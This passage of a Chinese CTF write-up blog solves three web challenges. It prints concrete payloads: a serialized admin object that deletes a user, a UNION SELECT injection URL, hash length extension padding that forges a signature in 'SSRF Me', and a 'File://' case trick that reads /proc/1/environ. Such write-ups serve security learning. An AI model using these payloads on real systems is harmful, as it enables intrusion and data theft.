&#125;</span><br></pre></td></tr></table></figure><p>那就是result[‘userid’]结果为空的情况下。</p><p>先利用api.php的一个接口函数从数据库删除我现在登陆的用户，使select * from user where name&#x3D;’$username’查询为空，因为我们一直登陆，所以session会在服务器端保持我们登陆的状态（也就是说服务器端的session不会注销），所以if($_SESSION[‘user’])在注销之前一直为真，所以当我们在数据库中删除我们登陆的用户之后，则使：$id &#x3D; intval($result[‘userid’]); 这里$id成为一个未被初始化的变量，然后就可以被任意覆盖。在common.php中进行变量覆盖。</p><p>在api.php中，如果我们想要删除用户，是需要check&#x3D;&#x3D;&#x3D;1的，里面存在一个考点：hash长度拓展攻击。</p><p>我们先获取一下userid，待会要删除的userid</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104115507603.png" alt="image-20250104115507603" style="zoom:80%;" /><p>userid为2</p><p>然后去构造api的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;role&#x27;</span>] == <span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure><p>只有admin用户才能删除用户，那么我们构造如下payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">admin</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$name</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$check</span>=<span class="string">&quot;f94ecd6b9856b048313eeb7d0179cb32&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$data</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$method</span>=<span class="string">&quot;del_user&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$userid</span>=<span class="string">&quot;2&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">admin</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>这道题salt直接告诉我们了，我们就不需要hash长度拓展攻击了。。。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104115941234.png" alt="image-20250104115941234"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tzo1OiJhZG1pbiI6NTp7czo0OiJuYW1lIjtzOjU6ImFkbWluIjtzOjU6ImNoZWNrIjtzOjMyOiJmOTRlY2Q2Yjk4NTZiMDQ4MzEzZWViN2QwMTc5Y2IzMiI7czo0OiJkYXRhIjtzOjE6IjEiO3M6NjoibWV0aG9kIjtzOjg6ImRlbF91c2VyIjtzOjY6InVzZXJpZCI7czoxOiIyIjt9</span><br></pre></td></tr></table></figure><p>然后去api.php删除用户。</p><p>但是我们发现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (@<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] === <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:/web/riji.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是我们需要保持登陆状态，那么换个浏览器。。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104120856200.png" alt="image-20250104120856200"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28105/api.php?api=Tzo1OiJhZG1pbiI6NTp7czo0OiJuYW1lIjtzOjU6ImFkbWluIjtzOjU6ImNoZWNrIjtzOjMyOiJmOTRlY2Q2Yjk4NTZiMDQ4MzEzZWViN2QwMTc5Y2IzMiI7czo0OiJkYXRhIjtzOjE6IjEiO3M6NjoibWV0aG9kIjtzOjg6ImRlbF91c2VyIjtzOjY6InVzZXJpZCI7czoxOiIyIjt9</span><br></pre></td></tr></table></figure><p>user删除成功！</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104120932581.png" alt="image-20250104120932581"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28105/riji.php?id=-1%20union%20select%201,2,(select%20flag%20from%20flag)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104120944656.png" alt="image-20250104120944656"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;bea1ea82-0c83-4722-8a89-a41b35a5c119&#125;</span><br></pre></td></tr></table></figure><h2 id="De1ctf-2019-SSRF-Me"><a href="#De1ctf-2019-SSRF-Me" class="headerlink" title="[De1ctf 2019]SSRF Me"></a>[De1ctf 2019]SSRF Me</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span><br><span class="line">        <span class="variable language_">self</span>.action = action</span><br><span class="line">        <span class="variable language_">self</span>.param = param</span><br><span class="line">        <span class="variable language_">self</span>.sign = sign</span><br><span class="line">        <span class="variable language_">self</span>.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(<span class="variable language_">self</span>.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(<span class="variable language_">self</span>.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">self</span>.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> <span class="variable language_">self</span>.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % <span class="variable language_">self</span>.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(<span class="variable language_">self</span>.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> <span class="variable language_">self</span>.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % <span class="variable language_">self</span>.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> (getSign(<span class="variable language_">self</span>.action, <span class="variable language_">self</span>.param) == <span class="variable language_">self</span>.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">param</span>):</span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>):</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先理一下思路：最终的flag应该是在result.txt中的，那么就需要触发Task类的Exec方法，在&#x2F;De1ta路由下可以实现，同时action、param、sign可控。Exec方法中有一个checksign方法，这其实就考察到hash长度拓展攻击了。getsign可以获取到一个已知的hash值。</p><p>我们访问&#x2F;geneSign路由可以获取一个hash值，secert_key+scan的哈希值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_ invoke__">checkSign</span>(<span class="built_in">self</span>):</span><br><span class="line">       <span class="keyword">if</span> (<span class="title function_ invoke__">getSign</span>(<span class="built_in">self</span>.action, <span class="built_in">self</span>.param) == <span class="built_in">self</span>.sign):</span><br><span class="line">           <span class="keyword">return</span> True</span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           <span class="keyword">return</span> False</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">task = <span class="title function_ invoke__">Task</span>(action, param, sign, ip)</span><br><span class="line"><span class="keyword">return</span> json.<span class="title function_ invoke__">dumps</span>(task.<span class="title function_ invoke__">Exec</span>())</span><br></pre></td></tr></table></figure><p>题目给了提示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag is in ./flag.txt</span><br></pre></td></tr></table></figure><p>那么我们接下来的思路是利用scan将flag.txt写入result.txt，同时会print flag.txt的内容，我们先构造这个。</p><p>首先访问&#x2F;geneSign路由，获取secret_key+flag.txt+scan的hash值a95501825b9d23020a8f670b281649fa</p><p>然后在&#x2F;De1ta路由下构造action为scan，param为flag.txt，sign为a95501825b9d23020a8f670b281649fa。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104221216421.png" alt="image-20250104221216421"></p><p>只print了一个状态码。。。突然想起来要print resp.text才行。。那么就需要read了，但是我们能获取的hash值必定带有scan。这时我们突然注意到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if &quot;read&quot; in self.action:</span><br></pre></td></tr></table></figure><p>那么我们可以构造action为scanread</p><p>secret_key+flag.txt+scan的hash值是已知的。</p><p>在&#x2F;De1ta路由下构造action为scanxxxxxxxread，param为flag.txt，进行哈希长度拓展攻击。</p><p>signature:a95501825b9d23020a8f670b281649fa</p><p>data:scan</p><p>key length:24</p><p>data to add:read</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104223600499.png" alt="image-20250104223600499"></p><p>2d970424e20612e377913e4a9ea324af</p><p>scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read</p><p>在&#x2F;De1ta路由下构造action为scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read</p><p>param为flag.txt，sign为2d970424e20612e377913e4a9ea324af</p><p>发现不行。。。</p><p>重新捋一下思路：</p><p>有read，有scan就可以</p><p>访问&#x2F;geneSign路由，param为flag.txtread</p><p>那么获取secret_key+flag.txt+readscan的hash值523423f97fa7df58aec22413b39fd8f2</p><p>在&#x2F;De1ta路由下构造action为readscan，param为flag.txt不就好了。。。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104224546154.png" alt="image-20250104224546154"></p><p>直接出了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;2ef1cb7c-7d09-49ed-abe6-451e0b4bf48e&#125;</span><br></pre></td></tr></table></figure><p>接下来再回顾一下hash长度拓展攻击，还是得学。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104225223289.png" alt="image-20250104225223289"></p><p>成功了，密钥24位，有点不是很清楚，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">len(secert_key) = 16</span><br><span class="line">16 + len(&#x27;scan&#x27;) + len(&#x27;read&#x27;) = 24 = Key Length</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104225321393.png" alt="image-20250104225321393"></p><h2 id="prize-p4"><a href="#prize-p4" class="headerlink" title="prize_p4"></a>prize_p4</h2><p>这道题还是比较简单的，我卡在了一个点上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/getkey&#x27;, methods=[&quot;GET&quot;]) </span><br><span class="line"></span><br><span class="line">def getkey(): </span><br><span class="line">if request.method != &quot;GET&quot;: </span><br><span class="line">session[&quot;key&quot;]=SECRET_KEY</span><br></pre></td></tr></table></figure><p>这里可以用与GET相似的方法HEAD来绕过。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250105082600584.png" alt="image-20250105082600584"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template, url_for,redirect,render_template_string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> flag </span><br><span class="line"></span><br><span class="line">SECRET_KEY=<span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config.update(<span class="built_in">dict</span>(</span><br><span class="line">    SECRET_KEY=SECRET_KEY,</span><br><span class="line">))</span><br><span class="line"></span><br><span class="line"><span class="comment">#src in /app</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_data&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>():</span><br><span class="line">    data = request.form.get(<span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(data) <span class="keyword">is</span> <span class="built_in">str</span>:</span><br><span class="line">        data=data.encode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    url = request.form.get(<span class="string">&#x27;url&#x27;</span>, <span class="string">&#x27;http://127.0.0.1:8888/&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">and</span> url:</span><br><span class="line">        session[<span class="string">&#x27;data&#x27;</span>] = data</span><br><span class="line">        session[<span class="string">&#x27;url&#x27;</span>] = url</span><br><span class="line">        session[<span class="string">&quot;admin&quot;</span>]=<span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;home&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;/&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/home&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;admin&quot;</span>,<span class="literal">False</span>):</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="built_in">open</span>(__file__).read())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;home.html&quot;</span>,data=session.get(<span class="string">&#x27;data&#x27;</span>,<span class="string">&#x27;Not find data...&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getkey&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getkey</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method != <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        session[<span class="string">&quot;key&quot;</span>]=SECRET_KEY</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&#x27;&#x27;&#x27;@app.route(&#x27;/getkey&#x27;, methods=[&quot;GET&quot;])</span></span><br><span class="line"><span class="string">def getkey():</span></span><br><span class="line"><span class="string">    if request.method != &quot;GET&quot;:</span></span><br><span class="line"><span class="string">        session[&quot;key&quot;]=SECRET_KEY&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_hindd_result&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hindd_result</span>():</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;data&#x27;</span>] <span class="keyword">and</span> session[<span class="string">&#x27;url&#x27;</span>]:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file:&#x27;</span> <span class="keyword">in</span> session[<span class="string">&#x27;url&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;no no no&quot;</span></span><br><span class="line">        data=(session[<span class="string">&#x27;data&#x27;</span>]).decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        url_text=urllib.request.urlopen(session[<span class="string">&#x27;url&#x27;</span>]).read().decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> url_text <span class="keyword">in</span> data <span class="keyword">or</span> data <span class="keyword">in</span> url_text:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;you get it&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;what ???&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getflag&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>():</span><br><span class="line">    res = flag.waf(request)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><p>思路就是通过&#x2F;get_hindd_result路由进行盲注。</p><p>因为直接getflag他没回显啊？！</p><p>file过滤可以大小写绕过</p><p>尝试一下File:&#x2F;&#x2F;&#x2F;proc&#x2F;1&#x2F;environ     NSSCTF发现可行</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250105083934681.png" alt="image-20250105083934681"></p><p>接下来编写盲注脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 